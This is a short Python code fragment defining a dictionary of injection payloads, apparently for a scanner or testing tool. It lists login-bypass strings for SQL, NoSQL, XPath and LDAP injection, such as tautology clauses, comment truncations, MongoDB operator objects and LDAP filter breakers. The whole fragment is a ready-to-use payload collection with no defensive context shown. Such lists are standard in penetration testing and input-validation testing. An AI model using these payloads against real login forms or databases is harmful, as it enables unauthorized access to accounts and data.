INJECTION_PAYLOADS = {
    "SQL Injection": [
        "' OR '1'='1", "admin' --", "admin' #", "admin'/*",
        "' OR '1'='1' --", "' OR '1'='1' #", "' OR '1'='1'/*",
        "admin' OR '1'='1", "admin' OR '1'='1' --",
        "admin' OR '1'='1' #", "admin' OR '1'='1'/*"
    ],
    "NoSQL Injection": [
        '{"$ne": null}', '{"$gt": ""}', '{"$regex": ".*"}',
        '{"$in": [null, ""]}', '{"$exists": true}'
    ],
    "XPath Injection": [
        "' or '1'='1", "' or ''='", "' or 1]%00", "' or /* or '",
        "' or \"a\" or '", "' or 1 or '", "' or true() or '",
        "'or string-length(name(.))<10 or'", "'or contains(name,'adm') or'",
        "'or contains(.,'adm') or'", "'or position()=2 or'",
        "admin' or '", "admin' or '1'='2"
    ],
    "LDAP Injection": [
        "*", "*)(&", "*)(|(&", "pwd)", "*)(|(*", "*))%00",
        "admin)(&)", "pwd", "admin)(!(&(|", "pwd))", "admin))(|(|"
    ]
}

